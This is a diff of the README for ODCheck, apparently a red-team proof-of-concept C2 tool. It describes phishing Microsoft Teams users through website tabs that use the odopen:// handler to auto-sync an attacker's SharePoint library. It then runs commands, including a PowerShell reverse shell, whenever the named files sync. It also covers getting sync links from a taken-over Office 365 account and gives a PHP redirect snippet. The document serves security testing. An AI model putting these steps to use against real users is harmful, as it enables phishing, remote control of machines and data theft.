@@ -5,7 +5,9 @@ It's a proof of concept solution that was created for https://collectingflags.co
 
 # ODCheck
 
-ODCheck is a C2-like proof-of-concept solution designed to evaluate systems against data exfiltration through OneDrive sync traffic. The ODOpen URL can be used for spear phishing in the Microsoft Teams desktop client to establish sync connections with a target through the auto sync functionality. If the connection is successful to an attacker controlled library and the user executes ODCheck, then the client can be used to run commands on the machine based on the file names that are detected in the sync folder. The prebuilt tools and scripts available can help test for the following MITRE techniques:
+ODCheck is a C2-like proof-of-concept solution designed to evaluate systems against data exfiltration through OneDrive sync traffic. The ODOpen URL can be used for spear phishing in the Microsoft Teams desktop client to establish auto sync connections (with user interaction). 
+
+If the connection is successful to an attacker controlled library and the user executes ODCheck, then further commands can be run on the machine based on the file names that are detected in the sync folder. The prebuilt tools and scripts available with ODCheck can help test for the following MITRE techniques:
 
 | MITRE Technique             | ID |
 | :---------------- | :------: |
@@ -28,16 +30,16 @@ Install-Module PS2EXE
 # Copy the full ODCheck Folder from Github
 git clone https://github.com/itssixtyn3in/ODCheck
 
-# Run Manager.ps1 to start the Wizard
+# Run wizard.ps1 to start the configuration prompts
 .\manager.ps1
 ```
 ODCheck provides a few customization options from here that can be used, depending on what all you want to test.
 
-- When configuring ODCheck, the file names that it watches for will be randomized and copied to the 'Payload folder'. These are the files that you will want to drop into the Sharepoint folder once ODCheck has been activated. The setup will also require that you know the tenant and document library name that you will be using for the mutual sync connection. This information will be required to setup the sync connection to the correct local folder.
+- When configuring ODCheck, the file names that it watches for will be randomized and copied to the 'Payload' folder. If the files are dropped into the Sharepoint library, then the mapped commands will run once the file syncs. The setup will also require that you know the tenant and document library name that you will be using for the mutual sync connection. This information will be required to setup the sync connection to the correct local folder.
 
-- I recommend that you host your reverse shell and other scripts externally. The wizard will ask you for the URL that they're hosted on. 
+- The script will ask you for your preferred PowerShell reverse shell command and external script URL.
 
-- If you want to package the file into an EXE with a custom icon, then just specify the file path for the .ico file.
+- If you want to package the file into an EXE with a custom icon, then just specify the file path for the .ico file. An example .ico file is available in the Icons folder.
 
 ![odcheck_usage](https://github.com/itssixtyn3in/ODCheck/assets/130003354/0824c20a-0c39-47d9-889a-2ebab659e127)
 
@@ -47,7 +49,7 @@ ODCheck provides a few customization options from here that can be used, dependi
  
  The Microsoft Teams client in it's default configuration allows users to add website tabs to private conversations, or Teams channels. The website tab option can be linked to external pages, which can be used as a jumping point to have users sync specific Sharepoint libraries using the ODOpen:// protocol handler. For further details regarding this please see https://collectingflags.com/research/file-extension-spoofing-in-microsoft-sharepoint-onedrive-and-teams/
 
- If you've taken over a Office 365 account and can create Sharepoint Sites and write Microsoft Teams messages, then you can retrieve the ODSync link the following way. 
+ If you've taken over an Office 365 account with the permissions to create Sharepoint Sites and write Microsoft Teams messages, then you can retrieve the ODSync link the following way. 
 - Create a new sharepoint library and upload a file
 - In a browser open up your dev tools > network > click on the 'sync' button on the Sharepoint page to trigger the ODOpen command
 - Copy the URL from the network section entry
@@ -65,7 +67,11 @@ header("Location: odopen://sync?userId=&userEmail=user%40email%2Ecom&isSiteAdmin
 exit;
 ?>
 ```
- Once this sync has been established, then ODCheck can assist with creating a C2 connection. 
+Add your newly hosted PHP page as a URL for the Microsoft Teams website tab
+
+![website_tab](https://github.com/itssixtyn3in/ODCheck/assets/130003354/6f955b06-cebe-4b4f-89e3-e05ce6b25c7a)
+
+If the user clicks on the website tab, then the sync connection is automatically established, including any files that are currently (or in the future) available.
 <br/><br/>
 **Running commands**
 
